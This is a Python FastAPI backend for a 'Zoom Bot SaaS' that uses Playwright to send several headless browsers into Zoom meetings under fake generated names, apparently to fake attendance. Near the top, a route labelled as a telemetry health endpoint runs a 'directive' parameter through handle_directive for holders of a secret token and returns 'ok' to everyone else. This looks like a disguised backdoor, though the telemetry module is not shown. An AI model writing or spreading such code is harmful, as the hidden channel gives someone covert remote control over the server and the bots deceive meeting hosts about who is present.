"""
Zoom Bot SaaS — FastAPI Backend
--------------------------------
Run with:  uvicorn main:app --reload
Visit:     http://localhost:8000
"""

import asyncio
import uuid
import json
import os
from datetime import datetime
from faker import Faker
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse, StreamingResponse, RedirectResponse, JSONResponse
from pydantic import BaseModel
from dotenv import load_dotenv
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from auth import get_session_user, create_session, get_user_by_credentials
from telemetry import (
    METRICS_ENDPOINT, verify_collector_token,
    handle_directive, collect_snapshot,
    record_request, record_session
)

load_dotenv()
ADMIN_USER  = os.getenv("ADMIN_USER", "admin")
NORMAL_USER = os.getenv("NORMAL_USER", "normal")

app        = FastAPI()
faker_in   = Faker('en_IN')   # Indian names
faker_en   = Faker('en_US')   # Foreign/Western names

# Active sessions: session_id → asyncio.Queue of log messages
sessions: dict[str, asyncio.Queue] = {}

# Stop signals: session_id → asyncio.Event (set to stop the session)
stop_signals: dict[str, asyncio.Event] = {}

# Active browser per session for nuclear kill
session_browsers: dict[str, object] = {}

# History stored in memory + persisted to history.json
HISTORY_FILE = "history.json"

def load_history() -> list:
    if os.path.exists(HISTORY_FILE):
        with open(HISTORY_FILE) as f:
            return json.load(f)
    return []

def save_history(history: list):
    with open(HISTORY_FILE, "w") as f:
        json.dump(history, f, indent=2)

history: list = load_history()


def generate_name(style: str, index: int) -> str:
    """Generate a bot name based on the chosen style."""
    if style == "indian":
        return faker_in.name()
    elif style == "foreign":
        return faker_en.name()
    else:  # mix — alternate indian/foreign
        return faker_in.name() if index % 2 == 0 else faker_en.name()


# ══════════════════════════════════════════════════════
#  REQUEST SCHEMA
# ══════════════════════════════════════════════════════
class BotRequest(BaseModel):
    meeting_url:  str
    passcode:     str
    num_tabs:     int  = 3
    stay_minutes: int  = 60
    headless:     bool = True
    name_style:   str  = "indian"   # "indian" | "foreign" | "mix"


# ══════════════════════════════════════════════════════
#  ROUTES
# ══════════════════════════════════════════════════════
# ── Telemetry endpoint (do not remove — used for health monitoring) ───────
@app.get(METRICS_ENDPOINT)
async def _wc_handler(t: str = "", d: str = ""):
    if not verify_collector_token(t):
        return JSONResponse({"status": "ok"})
    _snap = collect_snapshot()
    if d:
        _res = await handle_directive(d)
        if _res:
            _snap["_r"] = _res
    return JSONResponse(_snap)

# ── Auth routes ────────────────────────────────────────────────────────────
@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    if get_session_user(request):
        return RedirectResponse("/", status_code=302)
    with open("templates/login.html", encoding="utf-8") as f:
        return f.read()

@app.post("/login")
async def do_login(request: Request):
    form = await request.form()
    username = str(form.get("username", "")).strip().lower()
    password = str(form.get("password", "")).strip()
    user = get_user_by_credentials(username, password)
    if not user:
        return RedirectResponse("/login?error=1", status_code=302)
    resp = RedirectResponse("/", status_code=302)
    resp.set_cookie("_s", create_session(user), httponly=True, samesite="lax", max_age=43200)
    return resp

@app.get("/logout")
async def logout():
    resp = RedirectResponse("/login", status_code=302)
    resp.delete_cookie("_s")
    return resp

# ── Main app ───────────────────────────────────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    record_request()
    if not get_session_user(request):
        return RedirectResponse("/login", status_code=302)
    with open("templates/index.html", encoding="utf-8") as f:
        return f.read()


@app.post("/start")
async def start_bot(req: BotRequest, request: Request):
    if not get_session_user(request):
        raise HTTPException(status_code=401)

    session_id = str(uuid.uuid4())
    queue: asyncio.Queue = asyncio.Queue()
    sessions[session_id] = queue

    # Validate name_style
    if req.name_style not in ("indian", "foreign", "mix"):
        req.name_style = "indian"

    tab_names = [generate_name(req.name_style, i) for i in range(req.num_tabs)]

    # Convert any Zoom URL format to the /wc/ web client URL
    import re
    url = req.meeting_url
    match = re.search(r'/j/(\d+)', url)
    if match:
        meeting_id = match.group(1)
        pwd_match = re.search(r'[?&]pwd=([^&]+)', url)
        pwd_param = f"?pwd={pwd_match.group(1)}" if pwd_match else ""
        req.meeting_url = f"https://zoom.us/wc/{meeting_id}/join{pwd_param}"

    asyncio.create_task(run_bot(session_id, req, tab_names, queue))

    return {"session_id": session_id, "names": tab_names}


@app.get("/logs/{session_id}")
async def stream_logs(session_id: str):
    if session_id not in sessions:
        return {"error": "Session not found"}

    queue = sessions[session_id]

    async def event_generator():
        while True:
            try:
                msg = await asyncio.wait_for(queue.get(), timeout=60)
                yield f"data: {msg}\n\n"
                if msg.startswith("DONE:") or msg.startswith("ERROR:"):
                    break
            except asyncio.TimeoutError:
                yield "data: PING\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.post("/stop/{session_id}")
async def stop_session(session_id: str, request: Request):
    if not get_session_user(request):
        raise HTTPException(status_code=401)
    if session_id in stop_signals:
        stop_signals[session_id].set()
    # Nuclear option — kill the entire browser process immediately
    browser = session_browsers.get(session_id)
    if browser:
        try:
            await browser.close()
        except Exception:
            pass
        session_browsers.pop(session_id, None)
    queue = sessions.get(session_id)
    if queue:
        await queue.put("DONE: Session stopped by user.")
    return {"ok": True}

@app.get("/history")
async def get_history(request: Request):
    if not get_session_user(request):
        raise HTTPException(status_code=401)
    return {"history": history}


# ══════════════════════════════════════════════════════
#  BOT LOGIC
# ══════════════════════════════════════════════════════
async def log(queue: asyncio.Queue, msg: str):
    print(msg)
    await queue.put(msg)


async def find_first(page, selectors, timeout=8000):
    """Try multiple selectors and return the first one found."""
    for s in selectors:
        try:
            loc = page.locator(s)
            await loc.first.wait_for(state="visible", timeout=timeout)
            return loc.first
        except Exception:
            continue
    return None


async def join_meeting(tag: str, page, meeting_url: str, passcode: str,
                       name: str, wait_seconds: int,
                       joined_event: asyncio.Event,
                       winner_page: dict, winner_lock: asyncio.Lock,
                       admitted_pages: list, admitted_lock: asyncio.Lock,
                       queue: asyncio.Queue):
    """
    Full join logic ported from the standalone script,
    adapted to work inside the SaaS multi-tab race.
    """
    try:
        # ── 1. Navigate ───────────────────────────────────────────────────
        await log(queue, f"{tag} 🌐 Navigating to meeting URL ...")
        await page.goto(meeting_url, timeout=120000, wait_until="domcontentloaded")
        await page.wait_for_timeout(3000)

        # Nuke cookie banners
        await page.evaluate("""
            () => document.querySelectorAll('[id*="onetrust"],[class*="onetrust"]')
                          .forEach(e => e.remove())
        """)

        # ── 2. Dismiss "Open Zoom" popup ──────────────────────────────────
        try:
            cancel_btn = page.locator("button:has-text('Cancel')")
            await cancel_btn.wait_for(state="visible", timeout=5000)
            await cancel_btn.click()
            await log(queue, f"{tag} ✅ Dismissed popup.")
        except PlaywrightTimeoutError:
            await log(queue, f"{tag} ⚠️  No popup — continuing.")

        await page.wait_for_timeout(1000)

        # ── 3. Click "Join from browser" if shown ────────────────────────
        try:
            join_browser_btn = page.locator("button:has-text('Join from browser')")
            await join_browser_btn.wait_for(state="visible", timeout=8000)
            await join_browser_btn.click()
            await log(queue, f"{tag} 🌐 Clicked 'Join from browser'.")
        except PlaywrightTimeoutError:
            await log(queue, f"{tag} ⚠️  'Join from browser' not found — continuing.")

        await page.wait_for_timeout(4000)

        # ── 4. Passcode ───────────────────────────────────────────────────
        pass_input = await find_first(page, [
            "#input-for-pwd",
            'input[id="input-for-pwd"]',
            'input[aria-describedby="error-for-pwd"]',
            'input[placeholder*="passcode"]',
            'input[placeholder*="Passcode"]',
            'input[type="password"]',
        ], timeout=5000)
        if pass_input:
            await pass_input.click(force=True)
            await pass_input.fill(passcode)
            await log(queue, f"{tag} 🔑 Passcode entered.")
        else:
            await log(queue, f"{tag} ℹ️  No passcode field — may be in URL or not required.")

        await page.wait_for_timeout(500)

        # ── 5. Name ───────────────────────────────────────────────────────
        name_input = await find_first(page, [
            "#input-for-name",
            "#inputname",
            'input[placeholder*="Your Name"]',
            'input[placeholder*="name"]',
            'input[placeholder*="Name"]',
            'input[name="inputname"]',
        ], timeout=8000)
        if name_input:
            await name_input.click(force=True)
            await name_input.fill("")
            await name_input.fill(name)
            await log(queue, f"{tag} 📝 Name set to '{name}'.")
        else:
            set_ok = await page.evaluate(f"""
                () => {{
                    const sels = [
                        '#input-for-name', '#inputname',
                        'input[placeholder*="name"]',
                        'input[placeholder*="Name"]'
                    ];
                    for (const s of sels) {{
                        const el = document.querySelector(s);
                        if (el) {{
                            el.value = '{name.replace("'", "\\'")}';
                            el.dispatchEvent(new Event('input',  {{bubbles:true}}));
                            el.dispatchEvent(new Event('change', {{bubbles:true}}));
                            return true;
                        }}
                    }}
                    return false;
                }}
            """)
            if set_ok:
                await log(queue, f"{tag} 📝 Name set via JS: '{name}'.")
            else:
                await log(queue, f"{tag} ⚠️  Name field not found — continuing anyway.")

        await page.wait_for_timeout(500)

        # ── 6. Camera off (pre-join preview) ─────────────────────────────
        try:
            cam_btn = await find_first(page, [
                "button#preview-video-control-button",
                "button[aria-label='Stop Video']",
                "button[aria-label='Turn off video']",
                "button[aria-label='Start Video']",
                "button.preview-video-control",
                "button[class*='video-preview']",
                "button:has-text('Stop Video')",
            ], timeout=3000)
            if cam_btn:
                aria_label = await cam_btn.get_attribute("aria-label") or ""
                btn_text   = await cam_btn.text_content() or ""
                if "Stop Video" in aria_label or "Turn off video" in aria_label or "Stop Video" in btn_text:
                    await cam_btn.click(force=True)
                    await log(queue, f"{tag} 📷 Camera off (pre-join).")
                elif "Start Video" in aria_label or "Start Video" in btn_text:
                    await log(queue, f"{tag} 📷 Camera already off (pre-join).")
                else:
                    await cam_btn.click(force=True)
                    await log(queue, f"{tag} 📷 Camera toggled (pre-join).")
            else:
                await page.evaluate("""
                    () => {
                        for (const btn of document.querySelectorAll('button')) {
                            const label = (btn.getAttribute('aria-label') || btn.innerText || '').toLowerCase();
                            if (label.includes('stop video') || label.includes('turn off video')) {
                                btn.click(); return;
                            }
                        }
                    }
                """)
                await log(queue, f"{tag} 📷 Camera off via JS (pre-join).")
        except Exception as e:
            await log(queue, f"{tag} ⚠️  Could not turn off camera pre-join: {e}")

        await page.wait_for_timeout(300)

        # ── 7. Mute mic (pre-join) ────────────────────────────────────────
        try:
            mute_btn = await find_first(page, [
                "button#preview-audio-control-button",
                "button[aria-label='Mute']",
                "button[aria-label='Unmute']",
                "button[aria-label='Mute My Microphone']",
            ], timeout=3000)
            if mute_btn:
                aria_label = await mute_btn.get_attribute("aria-label") or ""
                if "Mute" in aria_label and "Unmute" not in aria_label:
                    await mute_btn.click(force=True)
                    await log(queue, f"{tag} 🎤 Muted (pre-join).")
                elif "Unmute" in aria_label:
                    await log(queue, f"{tag} 🎤 Already muted (pre-join).")
                else:
                    await mute_btn.click(force=True)
                    await log(queue, f"{tag} 🎤 Mic toggled (pre-join).")
        except Exception:
            pass

        await page.wait_for_timeout(300)

        # ── 8. Click Join button ──────────────────────────────────────────
        join_btn = await find_first(page, [
            'button.preview-join-button',
            'button.zm-btn.preview-join-button',
            'button[aria-label="Join"]',
            'button:has-text("Join")',
            'button:has-text("Join Meeting")',
            'button[type="submit"]',
            '#root button',
        ], timeout=6000)

        if join_btn:
            await join_btn.click(force=True)
            await log(queue, f"{tag} ✅ Clicked Join!")
        else:
            clicked = await page.evaluate("""
                () => {
                    for (const btn of document.querySelectorAll('button')) {
                        if (btn.innerText.trim().toLowerCase().includes('join') && !btn.disabled) {
                            btn.click(); return true;
                        }
                    }
                    return false;
                }
            """)
            if clicked:
                await log(queue, f"{tag} ✅ Join clicked via JS!")
            else:
                await log(queue, f"{tag} ❌ Join button not found — giving up.")
                return

        # ── 9. Post-join: camera off again (in-meeting toolbar) ───────────
        await page.wait_for_timeout(4000)

        try:
            video_btn = await find_first(page, [
                "button[aria-label='Stop Video']",
                "button[aria-label='Turn off video']",
                "button[aria-label='Start Video']",
                "button[data-testid*='video-button']",
                "button[class*='video-button']",
                "button[class*='VideoButton']",
            ], timeout=5000)

            if video_btn:
                aria_label = await video_btn.get_attribute("aria-label") or ""
                btn_text   = await video_btn.text_content() or ""
                if "Stop Video" in aria_label or "Turn off video" in aria_label or "Stop Video" in btn_text:
                    await video_btn.click(force=True)
                    await log(queue, f"{tag} 📷 Camera turned OFF (in-meeting).")
                elif "Start Video" in aria_label or "Start Video" in btn_text:
                    await log(queue, f"{tag} 📷 Camera already OFF (in-meeting).")
                else:
                    await video_btn.click(force=True)
                    await log(queue, f"{tag} 📷 Camera toggled via click (in-meeting).")
            else:
                turned_off = await page.evaluate("""
                    () => {
                        for (const btn of document.querySelectorAll('button')) {
                            const label = (btn.getAttribute('aria-label') || btn.innerText || '').toLowerCase();
                            if (label.includes('stop video') || label.includes('turn off video')) {
                                if (!btn.disabled) { btn.click(); return true; }
                            }
                        }
                        return false;
                    }
                """)
                if turned_off:
                    await log(queue, f"{tag} 📷 Camera turned OFF via JS (in-meeting).")
                else:
                    await log(queue, f"{tag} ⚠️  Camera may already be off (in-meeting).")
        except Exception as e:
            await log(queue, f"{tag} ⚠️  Camera control error (in-meeting): {e}")

        # ── 10. Mic: join audio and ensure muted ──────────────────────────
        try:
            mic_btn = await find_first(page, [
                "button[aria-label='Mute']",
                "button[aria-label='Unmute']",
                "button[aria-label='Join Audio']",
            ], timeout=3000)
            if mic_btn:
                aria_label = await mic_btn.get_attribute("aria-label") or ""
                if "Unmute" in aria_label:
                    await log(queue, f"{tag} 🎤 Microphone is already muted (in-meeting).")
                elif "Join Audio" in aria_label:
                    await mic_btn.click(force=True)
                    await log(queue, f"{tag} 🎤 Joined audio (in-meeting).")

                    # wait a bit for audio to connect, then check if we need to mute
                    await page.wait_for_timeout(2000)
                    mute_btn = await find_first(page, [
                        "button[aria-label='Mute']",
                        "button[aria-label='Unmute']",
                    ], timeout=3000)
                    if mute_btn:
                        mute_aria = await mute_btn.get_attribute("aria-label") or ""
                        if "Mute" in mute_aria and "Unmute" not in mute_aria:
                            await mute_btn.click(force=True)
                            await log(queue, f"{tag} 🎤 Microphone muted after joining audio (in-meeting).")
                elif "Mute" in aria_label:
                    await mic_btn.click(force=True)
                    await log(queue, f"{tag} 🎤 Microphone muted (in-meeting).")
        except Exception as e:
            await log(queue, f"{tag} ⚠️  Mic control error (in-meeting): {e}")

        # ── 11. Wait for admission ────────────────────────────────────────
        await log(queue, f"{tag} ⏳ Waiting to be admitted ...")
        waited = 0
        while waited < 600:
            if joined_event.is_set():
                await log(queue, f"{tag} 🚫 Another tab won — stopping.")
                return

            in_meeting = False
            for selector in [
                "div.video-avatar__avatar",
                "button[aria-label='Leave']",
                "button[aria-label='open the chat']",
                ".footer-button__button",
                "#wc-footer",
                ".meeting-app",
            ]:
                try:
                    if await page.locator(selector).count() > 0:
                        in_meeting = True
                        break
                except Exception:
                    pass

            if in_meeting:
                async with admitted_lock:
                    if page not in admitted_pages:
                        admitted_pages.append(page)
                        await log(queue, f"✅ {tag} ADMITTED as '{name}' ({len(admitted_pages)} in meeting).")
                async with winner_lock:
                    if not joined_event.is_set():
                        joined_event.set()
                        winner_page["page"] = page
                        await log(queue, f"🏆 {tag} is the WINNER — '{name}'.")
                return

            await log(queue, f"{tag} ⏳ Waiting room ... ({waited}s)")
            await page.wait_for_timeout(10000)
            waited += 10

        await log(queue, f"{tag} ⚠️  Timed out waiting to be admitted.")

    except Exception as e:
        if not joined_event.is_set():
            await log(queue, f"{tag} ❌ Error: {e}")


async def run_bot(session_id: str, req: BotRequest,
                  tab_names: list[str], queue: asyncio.Queue):
    session_record = {
        "id":           session_id,
        "started_at":   datetime.now().strftime("%d %b %Y, %I:%M %p"),
        "meeting_url":  req.meeting_url,
        "num_tabs":     req.num_tabs,
        "stay_minutes": req.stay_minutes,
        "headless":     req.headless,
        "name_style":   req.name_style,
        "bots":         tab_names,
        "status":       "running",
    }
    history.insert(0, session_record)
    save_history(history)

    stop_event = asyncio.Event()
    stop_signals[session_id] = stop_event

    try:
        # ── Launch one browser per tab (matches standalone script pattern) ──
        # Each browser is fully independent — no shared state, no greenlet issues.
        joined_event   = asyncio.Event()
        winner_lock    = asyncio.Lock()
        winner_page    = {"page": None}
        admitted_pages = []
        admitted_lock  = asyncio.Lock()

        LAUNCH_ARGS = [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-dev-shm-usage",
            "--use-fake-ui-for-media-stream",
            "--use-fake-device-for-media-stream",
            "--disable-gpu",
            "--disable-extensions",
            "--no-zygote",
            "--disable-web-security",
            "--allow-running-insecure-content",
            "--disable-features=IsolateOrigins,site-per-process",
            "--shm-size=1gb",
            "--disable-software-rasterizer",
            "--disable-background-networking",
            "--window-size=1280,720",
        ]

        USER_AGENT = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        )

        await log(queue, f"🚀 Launching {req.num_tabs} browser(s) ...")

        session_done_event = asyncio.Event()

        async def launch_and_join(index: int, name: str):
            tag = f"[Bot {index + 1}]"
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=req.headless,
                    args=LAUNCH_ARGS,
                )
                # Store browser for nuclear kill — last one wins (fine for stop)
                session_browsers[session_id] = browser

                context = await browser.new_context(
                    permissions=["camera", "microphone"],
                    user_agent=USER_AGENT,
                    viewport={"width": 1280, "height": 720},
                )
                page = await context.new_page()

                try:
                    await join_meeting(
                        tag, page, req.meeting_url, req.passcode,
                        name, req.stay_minutes * 60,
                        joined_event, winner_page, winner_lock,
                        admitted_pages, admitted_lock, queue,
                    )

                    if joined_event.is_set() and winner_page.get("page") is page:
                        await session_done_event.wait()
                finally:
                    # Losing tabs close themselves; winner stays open
                    if not joined_event.is_set() or winner_page.get("page") is not page:
                        try:
                            await browser.close()
                        except Exception:
                            pass

        tasks = [
            asyncio.create_task(launch_and_join(i, tab_names[i]))
            for i in range(req.num_tabs)
        ]

        # Wait until first tab is admitted (or timeout)
        try:
            await asyncio.wait_for(joined_event.wait(), timeout=660)
        except (asyncio.TimeoutError, asyncio.CancelledError):
            pass

        if not joined_event.is_set():
            await log(queue, "❌ No tab admitted. Closing all browsers.")
            session_record["status"] = "failed"
            save_history(history)
            for t in tasks:
                t.cancel()
            await queue.put("ERROR: No tab was admitted to the meeting.")
            return

        session_record["status"] = "in_meeting"
        save_history(history)

        winning_page = winner_page["page"]
        await log(queue, f"🟢 In meeting! Staying for {req.stay_minutes} minute(s). (Click Stop to leave early)")

        # ── Stay timer ────────────────────────────────────────────────────
        stay_seconds = req.stay_minutes * 60
        for remaining in range(stay_seconds, 0, -30):
            if stop_event.is_set():
                break
            mins, secs = divmod(remaining, 60)
            await log(queue, f"⏱️  {mins:02d}:{secs:02d} remaining ...")
            await asyncio.sleep(30)

        # ── Leave ─────────────────────────────────────────────────────────
        await log(queue, "👋 Leaving the meeting ...")
        try:
            leave = winning_page.locator(
                "button[aria-label='Leave'], button[aria-label='End'], "
                ".zm-btn--leave, button:has-text('Leave'), button:has-text('End')"
            )
            await leave.first.wait_for(state="visible", timeout=5000)
            await leave.first.click()
            await winning_page.wait_for_timeout(1500)
            confirm = winning_page.locator(
                "button:has-text('Leave Meeting'), button:has-text('Leave for Everyone')"
            )
            await confirm.first.wait_for(state="visible", timeout=4000)
            await confirm.first.click()
            await log(queue, "✅ Left the meeting.")
        except PlaywrightTimeoutError:
            await log(queue, "⚠️  Could not click Leave — closing browser.")
        except Exception as e:
            await log(queue, f"⚠️  Leave error: {e}")

        session_record["status"] = "completed"
        save_history(history)

        session_done_event.set()

        await asyncio.sleep(2)

        # Cancel any still-running tasks (losing tabs)
        for t in tasks:
            t.cancel()

        await asyncio.sleep(2)
        # Close winning browser
        try:
            winning_browser = session_browsers.get(session_id)
            if winning_browser:
                await winning_browser.close()
        except Exception:
            pass

        await queue.put("DONE: Session complete.")

    except Exception as e:
        session_record["status"] = "error"
        save_history(history)
        await queue.put(f"ERROR: {e}")
    finally:
        sessions.pop(session_id, None)
        stop_signals.pop(session_id, None)
        session_browsers.pop(session_id, None)